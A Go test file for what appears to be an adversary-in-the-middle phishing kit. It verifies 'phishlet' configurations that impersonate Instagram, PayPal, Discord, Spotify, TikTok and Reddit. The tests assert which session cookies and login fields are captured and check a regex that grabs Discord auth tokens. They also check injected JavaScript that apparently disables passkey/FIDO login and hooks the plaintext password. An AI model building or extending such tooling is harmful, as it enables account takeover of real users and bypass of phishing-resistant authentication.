package core

import (
	"strings"
	"testing"
)

// ---- Instagram ------------------------------------------------------------

func TestInstagram_Load(t *testing.T) {
	pl := loadPhishlet(t, "instagram", "../phishlets/instagram.yaml", nil)
	if pl.Name != "instagram" {
		t.Errorf("name = %q, want instagram", pl.Name)
	}
}

func TestInstagram_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "instagram", "../phishlets/instagram.yaml", nil)
	if got := len(pl.proxyHosts); got < 2 {
		t.Errorf("proxy_hosts = %d, want >= 2", got)
	}
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "instagram" && h.is_landing {
			found = true
		}
	}
	if !found {
		t.Error("no landing proxy host with phish_sub 'instagram'")
	}
}

func TestInstagram_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "instagram", "../phishlets/instagram.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".instagram.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .instagram.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["sessionid"] {
		t.Error("primary session cookie 'sessionid' missing")
	}
}

func TestInstagram_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "instagram", "../phishlets/instagram.yaml", nil)
	if pl.username.key_s != "username" {
		t.Errorf("username key = %q, want 'username'", pl.username.key_s)
	}
	// enc_password is the primary password field (client-side encrypted)
	if pl.password.key_s != "enc_password" {
		t.Errorf("password key = %q, want 'enc_password'", pl.password.key_s)
	}
	// _pw hidden field (plain password via js_inject hook) must be in custom
	pwFound := false
	for _, f := range pl.custom {
		if f.key_s == "_pw" {
			pwFound = true
		}
	}
	if !pwFound {
		t.Error("custom credential '_pw' (plain password hook) missing")
	}
}

func TestInstagram_JsInject(t *testing.T) {
	pl := loadPhishlet(t, "instagram", "../phishlets/instagram.yaml", nil)
	if len(pl.js_inject) == 0 {
		t.Fatal("js_inject section is empty")
	}
	js := pl.js_inject[0]
	for _, sym := range []string{"PublicKeyCredential", "navigator.credentials.get", "NotAllowedError", "_caphid", "_pw"} {
		if !strings.Contains(js.script, sym) {
			t.Errorf("js_inject script missing symbol %q", sym)
		}
	}
}

// ---- PayPal ---------------------------------------------------------------

func TestPayPal_Load(t *testing.T) {
	pl := loadPhishlet(t, "paypal", "../phishlets/paypal.yaml", nil)
	if pl.Name != "paypal" {
		t.Errorf("name = %q, want paypal", pl.Name)
	}
}

func TestPayPal_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "paypal", "../phishlets/paypal.yaml", nil)
	if got := len(pl.proxyHosts); got < 2 {
		t.Errorf("proxy_hosts = %d, want >= 2", got)
	}
}

func TestPayPal_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "paypal", "../phishlets/paypal.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".paypal.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .paypal.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["cookie_check"] {
		t.Error("primary session cookie 'cookie_check' missing")
	}
}

func TestPayPal_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "paypal", "../phishlets/paypal.yaml", nil)
	if pl.username.key_s != "login_email" {
		t.Errorf("username key = %q, want 'login_email'", pl.username.key_s)
	}
	if pl.password.key_s != "login_password" {
		t.Errorf("password key = %q, want 'login_password'", pl.password.key_s)
	}
}

func TestPayPal_FidoJsInject(t *testing.T) {
	pl := loadPhishlet(t, "paypal", "../phishlets/paypal.yaml", nil)
	if len(pl.js_inject) == 0 {
		t.Fatal("js_inject section is empty")
	}
	for _, sym := range []string{"PublicKeyCredential", "NotAllowedError"} {
		if !strings.Contains(pl.js_inject[0].script, sym) {
			t.Errorf("js_inject missing symbol %q", sym)
		}
	}
}

// ---- Discord --------------------------------------------------------------

func TestDiscord_Load(t *testing.T) {
	pl := loadPhishlet(t, "discord", "../phishlets/discord.yaml", nil)
	if pl.Name != "discord" {
		t.Errorf("name = %q, want discord", pl.Name)
	}
}

func TestDiscord_ApexDomain(t *testing.T) {
	pl := loadPhishlet(t, "discord", "../phishlets/discord.yaml", nil)
	// login.domain must resolve to bare apex 'discord.com' (empty orig_sub)
	if pl.login.domain != "discord.com" {
		t.Errorf("login.domain = %q, want 'discord.com'", pl.login.domain)
	}
}

func TestDiscord_BodyAuthToken(t *testing.T) {
	pl := loadPhishlet(t, "discord", "../phishlets/discord.yaml", nil)
	if len(pl.bodyAuthTokens) == 0 {
		t.Fatal("no body auth tokens configured")
	}
	tok, ok := pl.bodyAuthTokens["token"]
	if !ok {
		t.Fatal("body auth token 'token' not found")
	}
	// Search regex must match a Discord token JSON response
	sample := `{"token":"MTAxMjM0NTY3ODkwMTIzNA.GAbcde.xyz123","user_settings":{}}`
	if !tok.search.MatchString(sample) {
		t.Error("body token search regex did not match sample Discord login response")
	}
}

func TestDiscord_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "discord", "../phishlets/discord.yaml", nil)
	if pl.username.key_s != "login" {
		t.Errorf("username key = %q, want 'login'", pl.username.key_s)
	}
	if pl.password.key_s != "password" {
		t.Errorf("password key = %q, want 'password'", pl.password.key_s)
	}
}

func TestDiscord_AuthUrls(t *testing.T) {
	pl := loadPhishlet(t, "discord", "../phishlets/discord.yaml", nil)
	for _, want := range []string{"/api/v9/auth/login", "/api/v9/auth/mfa/totp"} {
		matched := false
		for _, re := range pl.authUrls {
			if re.MatchString(want) {
				matched = true
				break
			}
		}
		if !matched {
			t.Errorf("auth_url %q not matched", want)
		}
	}
}

// ---- Spotify --------------------------------------------------------------

func TestSpotify_Load(t *testing.T) {
	pl := loadPhishlet(t, "spotify", "../phishlets/spotify.yaml", nil)
	if pl.Name != "spotify" {
		t.Errorf("name = %q, want spotify", pl.Name)
	}
}

func TestSpotify_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "spotify", "../phishlets/spotify.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".spotify.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .spotify.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["sp_dc"] {
		t.Error("primary session cookie 'sp_dc' missing")
	}
}

func TestSpotify_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "spotify", "../phishlets/spotify.yaml", nil)
	if pl.username.key_s != "username" {
		t.Errorf("username key = %q, want 'username'", pl.username.key_s)
	}
	if pl.password.key_s != "password" {
		t.Errorf("password key = %q, want 'password'", pl.password.key_s)
	}
}

func TestSpotify_LandingHost(t *testing.T) {
	pl := loadPhishlet(t, "spotify", "../phishlets/spotify.yaml", nil)
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "spotify" && h.is_landing {
			found = true
		}
	}
	if !found {
		t.Error("no landing proxy host with phish_sub 'spotify'")
	}
}

// ---- TikTok ---------------------------------------------------------------

func TestTikTok_Load(t *testing.T) {
	pl := loadPhishlet(t, "tiktok", "../phishlets/tiktok.yaml", nil)
	if pl.Name != "tiktok" {
		t.Errorf("name = %q, want tiktok", pl.Name)
	}
}

func TestTikTok_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "tiktok", "../phishlets/tiktok.yaml", nil)
	if got := len(pl.proxyHosts); got < 3 {
		t.Errorf("proxy_hosts = %d, want >= 3", got)
	}
}

func TestTikTok_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "tiktok", "../phishlets/tiktok.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".tiktok.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .tiktok.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["sessionid"] {
		t.Error("primary session cookie 'sessionid' missing")
	}
}

func TestTikTok_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "tiktok", "../phishlets/tiktok.yaml", nil)
	if pl.username.key_s != "email" {
		t.Errorf("username key = %q, want 'email'", pl.username.key_s)
	}
}

func TestTikTok_FidoJsInject(t *testing.T) {
	pl := loadPhishlet(t, "tiktok", "../phishlets/tiktok.yaml", nil)
	if len(pl.js_inject) == 0 {
		t.Fatal("js_inject section is empty")
	}
	for _, sym := range []string{"PublicKeyCredential", "NotAllowedError"} {
		if !strings.Contains(pl.js_inject[0].script, sym) {
			t.Errorf("js_inject missing symbol %q", sym)
		}
	}
}

// ---- Reddit ---------------------------------------------------------------

func TestReddit_Load(t *testing.T) {
	pl := loadPhishlet(t, "reddit", "../phishlets/reddit.yaml", nil)
	if pl.Name != "reddit" {
		t.Errorf("name = %q, want reddit", pl.Name)
	}
}

func TestReddit_ProxyHosts(t *testing.T) {
	pl := loadPhishlet(t, "reddit", "../phishlets/reddit.yaml", nil)
	if got := len(pl.proxyHosts); got < 3 {
		t.Errorf("proxy_hosts = %d, want >= 3", got)
	}
}

func TestReddit_AuthTokens(t *testing.T) {
	pl := loadPhishlet(t, "reddit", "../phishlets/reddit.yaml", nil)
	tokens, ok := pl.cookieAuthTokens[".reddit.com"]
	if !ok {
		t.Fatal("auth_tokens missing for .reddit.com")
	}
	found := make(map[string]bool)
	for _, tok := range tokens {
		found[tok.name] = true
	}
	if !found["token_v2"] {
		t.Error("primary session cookie 'token_v2' missing")
	}
}

func TestReddit_Credentials(t *testing.T) {
	pl := loadPhishlet(t, "reddit", "../phishlets/reddit.yaml", nil)
	if pl.username.key_s != "username" {
		t.Errorf("username key = %q, want 'username'", pl.username.key_s)
	}
	if pl.password.key_s != "password" {
		t.Errorf("password key = %q, want 'password'", pl.password.key_s)
	}
}

func TestReddit_OldRedditHost(t *testing.T) {
	pl := loadPhishlet(t, "reddit", "../phishlets/reddit.yaml", nil)
	found := false
	for _, h := range pl.proxyHosts {
		if h.phish_subdomain == "old" {
			found = true
		}
	}
	if !found {
		t.Error("old.reddit.com proxy host ('old') missing")
	}
}
